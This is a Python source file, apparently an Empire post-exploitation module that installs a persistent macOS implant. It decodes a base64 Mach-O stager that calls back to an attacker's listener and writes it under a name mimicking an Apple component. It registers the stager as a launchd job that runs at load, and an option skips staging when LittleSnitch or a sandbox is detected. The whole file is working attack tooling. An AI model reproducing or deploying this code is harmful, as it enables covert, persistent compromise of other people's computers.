import base64
import os
class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'LaunchDaemon',

            # list of one or more authors for the module
            'Author': ['@xorrior', '@malcomvetter', '@h1ghtopfade', 'notcharles'],

            # more verbose multi-line description of the module
            'Description': ('Installs an Empire launchDaemon.'),

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : None,

            # if the module needs administrative privileges
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : False,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': []
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'SafeChecks' : {
                'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required'      :   True,
                'Value'         :   'True'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'DaemonName' : {
                'Description'   :   'Name of the Launch Daemon to install. Name will also be used for the plist file.',
                'Required'      :   True,
                'Value'         :   'com.apple.proxy.initialize'
            },
            'DaemonPath' : {
                'Description'   :   'The relative path of where the Empire launch daemon should be located.',
                'Required'      :   True,
                'Value'         :   'Library/LaunchAgents/'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self):

        daemonName = self.options['DaemonName']['Value']
        daemonPath = self.options['DaemonPath']['Value']
        # add trailing slash if not present
        daemonPath = os.path.join(daemonPath, '')
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        safeChecks = self.options['SafeChecks']['Value']
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python', userAgent=userAgent, safeChecks=safeChecks)
        launcher = launcher.strip('echo').strip(' | python &').strip("\"")
        machoBytes = self.mainMenu.stagers.generate_macho(launcherCode=launcher)
        encBytes = base64.b64encode(machoBytes)

        script = """
import subprocess
import sys
import base64
import os
import string
import random

def label_generator(size=6, chars=string.ascii_uppercase + string.digits):
        return ''.join(random.choice(chars) for _ in range(size))

my_env = os.environ.copy()
username = my_env["USER"]

encBytes = "%s"
bytes = base64.b64decode(encBytes)
daemonPath = "%s"
daemonName = "%s"
fullPath = "/Users/" + username + "/" + daemonPath

plist = \"\"\"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
        <key>KeepAlive</key>
        <false/>
        <key>Label</key>
        <string>||label||</string>
        <key>Program</key>
        <string>||fullPath||||daemonName||</string>
        <key>ProgramArguments</key>
        <array>
                <string>||fullPath||||daemonName||</string>
        </array>
        <key>LaunchOnlyOnce</key>
        <true/>
        <key>RunAtLoad</key>
        <true/>
</dict>
</plist>\"\"\"


plist = plist.replace("||daemonName||", daemonName)
plist = plist.replace("||fullPath||", fullPath)
plist = plist.replace("||label||", label_generator(15))


if not os.path.exists(fullPath):
    os.makedirs(fullPath)


e = open(fullPath + daemonName,'wb')
e.write(bytes)
e.close()

os.chmod(fullPath + daemonName, 0777)
plistFilename = fullPath + daemonName + ".plist"

f = open(plistFilename,'w')
f.write(plist)
f.close()

process = subprocess.Popen('chmod 644 ' + plistFilename, stdout=subprocess.PIPE, shell=True)
process.communicate()

process = subprocess.Popen('chown -R root ' + plistFilename, stdout=subprocess.PIPE, shell=True)
process.communicate()

process = subprocess.Popen('chown :wheel ' + plistFilename, stdout=subprocess.PIPE, shell=True)
process.communicate()

process = subprocess.Popen('launchctl unload ' + plistFilename, stdout=subprocess.PIPE, shell=True)
process.communicate()

process = subprocess.Popen('launchctl load ' + plistFilename, stdout=subprocess.PIPE, shell=True)
process.communicate()

print "\\n[+] Persistence has been installed: " + plistFilename
print "\\n[+] Empire daemon has been written to " + fullPath

""" % (encBytes, daemonPath, daemonName)

        return script
